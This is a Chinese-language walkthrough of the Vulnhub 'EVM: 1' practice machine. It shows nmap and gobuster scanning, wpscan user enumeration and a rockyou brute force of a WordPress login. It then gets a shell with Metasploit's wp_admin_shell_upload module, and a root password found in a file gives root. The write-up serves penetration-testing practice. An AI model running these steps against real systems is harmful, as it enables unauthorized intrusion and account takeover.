---
title: "EVM: 1-Vulnhub Walkthrough"
categories: [ "安全技术" ]
tags: [ "vulnhub","靶机","walkthrough" ]
draft: false
slug: "505"
date: "2020-02-14 10:40:00"
---

[靶机地址][1]

## 工具及漏洞信息

- netdiscover
- nmap
- gobuster
- wpscan

## 0x01 信息收集

### 扫描靶机

`netdiscover`的`-r`参数扫描`192.168.1.0/16`结果如下：

![][2]

`nmap`扫描主机及端口信息：

```
nmap -sS -A -n -T4 -p- 192.168.1.7
```

![][3]

### 扫描漏洞

这里使用了`nmap`的`vulscan`脚本：

```
cd /usr/share/nmap/scripts/
git clone https://github.com/vulnersCom/nmap-vulners
nmap --script nmap-vulners -sV 192.168.1.7
```

![][4]

看起来很多，测试了最新几个 CVE，均无法利用

### 扫描路径

`gobuster`扫描路径：

```
gobuster dir -u http://192.168.1.7 -s 200,301,302 -t 50 -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

这里使用的字典是`kali`自带的，如果没有可以通过`apt-get install wordlists -y`安装

![][5]

打开主页:

![][6]

提示我们`wordpress`目录易受攻击，于是我们打开看看

## 0x02 普通用户 getshell

这里我也遇到了大佬们说的虽然靶机信息说的支持`DHCP`

但是访问`靶机ip/wordpress`会跳转到`192.168.56.103`

其实我们不访问`wordpress`界面也能进行下去，我这里就不折腾了

先给`wpscan`[申请][7]一个`wpvulnhub`的`API`，然后扫描:

```
wpscan --url http://192.168.1.7/wordpress/ -e at -e ap -e u --api-token xxxxxxxxxxxx
```

- -e at:扫描所有主题
- -e ap:扫描所有插件
- -e u:扫描用户

扫描到 4 个可能的漏洞：

![][8]

扫描出一个用户`c0rrupt3d_brain`:

![][9]

扫描出用户就可以接着爆破密码，`kali`自带字典`/usr/share/wordlists/rockyou.txt`

如果没有可以从这里[下载][10]

```
wpscan --url http://192.168.1.7/wordpress/ -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt -t 50
```

爆破实在太慢了，得到密码为：`24992499`，账户密码都得到了，上`msf`:

```
use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.7
set targeturi /wordpress
set username c0rrupt3d_brain
set password 24992499
run
```

![][11]

获得的`meterpreter`会话：

![][12]

## 0x03 提权 root

可以直接在`meterpreter`查看目录文件：

![][13]

成功获取到`root`的密码`willy26`，切换账号登录

进入`shell`，发现是老朋友“无输出”环境，使用`python`获取`tty`:

```
shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![][14]

然后切换至`root`账户并成功获取`flag`:

![][15]

参考文章：

- [Vulhub 系列：EVM 1][16]
- [EVM: 1 Vulnhub Walkthrough][17]
- [如何利用 NSE 检测 CVE 漏洞][18]
- [VulnHub 靶机系列实战教程][19]

本文完。

[1]: https://www.vulnhub.com/entry/evm-1,391/
[2]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_104215.png
[3]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_104711.png
[4]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_152451.png
[5]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_112148.png
[6]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_112215.png
[7]: https://wpvulndb.com/users/sign_up
[8]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_142613.png
[9]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_142704.png
[10]: http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
[11]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_153051.png
[12]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_153130.png
[13]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_153650.png
[14]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_153848.png
[15]: https://img.soapffz.com/archives_img/2020/02/14/archives_20200214_154001.png
[16]: https://mp.weixin.qq.com/s/hbTDgONOdTQGbftffEwrEQ
[17]: https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/
[18]: https://www.freebuf.com/sectool/161664.html
[19]: https://mp.weixin.qq.com/s/skCNWPiEPgJcHXSmsif5qQ